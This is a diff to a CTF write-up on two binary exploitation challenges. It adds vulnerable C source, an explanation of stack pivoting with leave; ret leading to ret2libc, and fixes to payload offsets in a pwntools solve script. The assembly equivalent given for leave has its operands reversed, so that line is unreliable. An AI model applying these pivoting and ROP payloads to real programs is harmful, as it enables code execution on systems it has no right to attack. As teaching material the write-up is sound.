@@ -10,6 +10,70 @@ This was the first week where things were pretty difficult for me. I will add wr
 # pivot
 Stack pivoting, the address of your input is leaked, and you can use leave; ret to jump to it. From there it's a ret2libc.
 
+We are given source code:
+``` C
+#include <stdio.h>
+void vuln() {
+	char buf[8];
+	fgets(buf, 24, stdin);
+}
+
+
+void query() {
+	malloc(4096 * 4);
+	printf("whats you're name?\n");
+	char* name = malloc(256);
+	fgets(name, 256, stdin);
+	printf("nice to meet you %s!  i left your name tag at 0x%lx\n", name, name);
+	vuln();
+}
+
+void main() {
+	setvbuf(stdout, 0, _IONBF,0);
+	setvbuf(stdin, 0, _IONBF,0);
+	setvbuf(stderr, 0, _IONBF,0);
+	query();
+}
+```
+
+We get to write 255 bytes (because fgets reads one less than size), and then are given the address of the buffer. Next is a vuln function which consists of 8 bytes of buffer and then 15 more bytes (remember because fgets reads size-1, this took me ages to bug fix when I sent 24 bytes and was confused when my subsequent writes were all off by one byte.) This vuln is just enough to overwrite rbp and rip, but not enough to add anything after it. Luckily, this is enough since we can set rbp to point to our leaked input from query(). Then, we overwrite rip to jump to a leave ret instruction which will load our ropchain from our query write. The following is an explanation that will hopefully clear things up, but it IS a very confusing thing at first, so don't feel bad if you're confused.
+
+First, we need to understand how leave works. Essentially leave is the same as 
+``` asm
+mov rbp, rsp
+pop rbp
+```
+
+What this means is that the value in rbp is moved to rsp, and the next 8 bytes are popped from the "stack" (wherever rsp is now pointing) into rbp. Let's break down our exploit a bit more now that we understand how leave works.
+
+First, we write 8 bytes of whatever and then our ROPchain into query. So our name buffer will look like this:
+```
+name = "AAAAAAAA" + ropchain
+```
+
+Then we go into vuln, where we overwrite rbp to be the address of name, and rip to point to a leave ret gadget. Now, when we get to the end of the vuln function, right before the leave ret, our registers will look like
+```
+rsp = some real stack address
+rbp = some real stack address, which points to the address of our name
+```
+
+Then, when the leave is executed, our registers will look like
+```
+rsp = some real stack address+ 8 (because the first 8 bytes are popped into rbp
+rbp = address of name buffer
+```
+
+So now, the ret will execute, and we will jump to the leave ret gadget. When that leave executes, our registers will look like
+```
+rsp = address of name buffer+8
+rbp = "AAAAAAAA"
+rip = first address in our ROPchain
+```
+and then the ROP chain will execute. As you can see, the first 8 bytes of our name buffer are actually loaded into rbp, so we should set that to some address with read and write permissions so things don't break in-between.
+
+So we have a way of executing a ROPchain, we can just do a ret2libc using this method.
+
+
 Solve script:
 ``` py
 #!/usr/bin/env python3
@@ -54,7 +118,7 @@ def main():
     name = p64(int(name, 16))
     print('name:', name)
     # send to first vuln()
-    r.send(b'B'*8 + name + leave_ret)
+    r.send(b'B'*8 + name + leave_ret[:-1])
 
     leak = r.recvline()
     base = u64(leak.rstrip().ljust(8, b'\x00')) - libc.symbols['puts']
@@ -63,8 +127,7 @@ def main():
     zero_rax = p64(base + 0x980f5)
 
     print(r.recvline())
-    r.sendline(b'C'*7 + zero_rax + onegadget)   # idk why but there was a weird null byte in this one that meant I only have to send 7 bytes of buffer. 
-                                                # Spent ages trying to figure out why my payload was offset by 1 byte but couldn't figure it out, still have no idea
+    r.sendline(b'C'*8 + zero_rax + onegadget)
     name2 = r.recvline().strip().split()[-1]
     name2 = p64(int(name2, 16))
     print('name2:', name2)
@@ -80,6 +143,32 @@ if __name__ == "__main__":
 
 # relative
 Stack pivoting by using add rsp instructions. The add rsp, 8 instruction conveniently makes it so it returns directly onto our input.
+
+We are given source code:
+``` C
+#include <stdio.h>
+#include <stdlib.h>
+
+
+void gadgets() {
+	asm("add $8, %rsp;");
+}
+
+void main() {
+	setvbuf(stdout, 0, _IONBF,0);
+	setvbuf(stdin, 0, _IONBF,0);
+	setvbuf(stderr, 0, _IONBF,0);
+	puts("hi lol");
+	char buf[8 * 4];
+	void (*exit_cached)(int, int, int);
+	exit_cached = exit;
+	fgets(buf, 8 * 6, stdin);
+	exit_cached(1,2,3);
+	return 1;
+}
+```
+
+We have a buffer overflow clearly, but not much else to work with. We can overwrite the value of exit_cached to call a function, so I first experimented with calling a bunch of different things like main and puts, but eventually I noticed that if you overwrite exit_cached to call the add rsp, 8 instruction, it moves rsp to the address of your input, which means when it tries to ret from gadget, it pops the first 8 bytes of your input into rip. So this means we can write a ROPchain into our input and overwrite exit_cached with the gadget to load the ROPchain. From here, I just used a ROPchain to leak libc and then jumped back to main. The next input is different since it segfaults in a different place. Luckily, it is still somewhere we control the value of, so we can just modify the size of our buffer to jump to another ROPchain and win.
 
 Solve script:
 ``` py
